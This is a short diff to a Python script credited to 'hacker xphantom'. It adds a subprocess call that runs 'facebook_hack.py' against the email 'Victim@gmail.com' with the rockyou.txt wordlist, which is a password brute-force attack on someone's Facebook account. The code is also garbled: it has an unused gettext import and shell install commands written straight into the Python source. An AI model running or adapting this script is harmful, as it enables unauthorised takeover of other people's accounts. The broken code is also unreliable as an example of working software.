@@ -1,5 +1,10 @@
 #bin/python
 #codded by hacker xphantom
 
+from gettext import install
+import subprocess
+
+result = subprocess.run(['python', 'facebook_hack.py', '-t', 'Victim@gmail.com', '-w', '/usr/share/wordlists/rockyou.txt'], capture_output=True, text=True)
+
 pip install mechanize
 pkg install wget
